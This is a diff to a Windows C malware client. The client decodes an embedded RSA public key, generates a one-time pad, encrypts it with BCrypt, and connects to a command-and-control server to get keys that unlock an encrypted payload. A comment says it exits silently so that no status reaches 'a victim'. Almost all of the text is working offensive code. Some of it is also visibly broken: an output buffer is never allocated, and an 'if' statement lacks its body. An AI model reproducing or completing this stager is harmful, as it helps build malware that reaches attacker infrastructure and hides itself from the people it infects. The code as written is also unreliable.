@@ -38,7 +38,7 @@ if( CryptImport ) {
  */
     BYTE* PemPubKey = PUBKEY; //Public key embedded in header
     PCCERT_CONTEXT pCertContext = NULL;
-    BYTE derPubKey[RSAKEYLEN] = {0};
+    BYTE* derPubKey;
     DWORD derPubKeyLen = RSAKEYLEN;
     BCRYPT_ALG_HANDLE alg;
     CERT_PUBLIC_KEY_INFO *PubKeyInfo;
@@ -53,7 +53,13 @@ if( CryptImport ) {
     BCRYPT_ALG_HANDLE randNumProv;
     BYTE* OTP = malloc(AESKEYLEN+1);
     memset(OTP,0,AESKEYLEN+1);
-   
+/* 
+ * Define variables required to store the encrypted OTP
+ */
+    PUCHAR EncryptedOTP;
+    ULONG EncryptedOTPLen;
+    ULONG EncryptedOTPWriteLen;
+
 /*
  * Definitions of variables for the windows client
  */
@@ -64,24 +70,38 @@ if( CryptImport ) {
  * retrieving the public key
  * in the event of an error silently exit 0. No reason to provide a return status to a victim
  */
-    printf("%s\n", PemPubKey);
-    if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
-    {
-   	exit(0);
-    }
-    printf("\n%d ",derPubKeyLen);
-    if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
-    {
-	    printf("failed\n");
-    	exit(0);
+   if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_ANY, NULL, &derPubKeyLen,NULL,NULL))
+   {
+	DWORD err = GetLastError();   
+	printf("DerLen %d",derPubKeyLen);
+	exit(0);
+   }
+   derPubKey = (BYTE*)malloc(derPubKeyLen);
+  if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
+   {
+	DWORD err = GetLastError();   
+	printf("failed to decode pem %d",err);
+	exit(0);
+   }
+   if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
+   {
+            printf("failed\n");
+   	    DWORD err = GetLastError();
+	    printf("Error AlgProvider: %d",err);
+	   
+	    exit(0);
     }
     if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
                             CRYPT_DECODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
     {
+	    DWORD err = GetLastError();
+	    printf("Error DecodeObject: %d",err);
 	    exit(0);
     }
     if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&hkey))
     {
+	    DWORD err = GetLastError();
+	    printf("Error ImportPubKeyInfo: %d",err);
 	    exit(0);
     };
 
@@ -101,29 +121,37 @@ if( CryptImport ) {
 		printf("error generating random number");
 		exit(0);
     	}
-	printf ("here");
-	for(int x=0; x<AESKEYLEN; x++)
-        	printf("0x%02x ", *(OTP+x));
 	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
 		{
 			printf("error closing handaler");
 			exit(0);
 		}
 
-/*
- * Encrypt the one time pad with the RSA key
- */
 	/*
-    if(CryptEncrypt(hKeyRSA,0,TRUE,0,OTP,&RsaCryptLen,AESKEYLEN+1))
-        exit(0);
+ 	* Encrypt the one time pad with the RSA key
+ 	*/
 
-        printf("\n\nCypher text keylen: %d\n",RsaCryptLen);
+	if(BCryptEncrypt(hkey,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
+	{
+		printf("error in calculating RSA output key length.");
+		exit(0);
+	}
 
-        for(int x=0; x<RsaCryptLen; x++)
-            printf("0x%02x ", *(OTP+x));
-/*
- *  Configure socket descriptor and set the socket IP address
- */
+	printf("\nEncryptedOTPLen: %d", EncryptedOTPLen);
+
+	/*
+ 	* Encrypt the one time pad with the RSA key
+ 	*/
+
+	if(BCryptEncrypt(hkey,(OTP), AESKEYLEN, NULL,NULL,0, EncryptedOTP,  EncryptedOTPLen, &EncryptedOTPWriteLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
+	{
+		printf("ERROR IN ENCRYPTING");
+		exit(0);
+	}
+
+	/*
+ 	 *  Configure socket descriptor and set the socket IP address
+ 	 */
     if (WSAStartup(0x0202,&wsaData))
 
     init.ai_family = AF_INET; // IPV4 address
@@ -139,7 +167,6 @@ if( CryptImport ) {
         WSACleanup();
         exit(0);
     }
-//    CryptBinaryToString(OTP,)
 /*
  * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
  * the payolad section, for this to work this client transmits a OTP that has been
@@ -147,7 +174,7 @@ if( CryptImport ) {
  */
      if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
     {
-        printf("here");
+        
         exit(-1);
     }
 
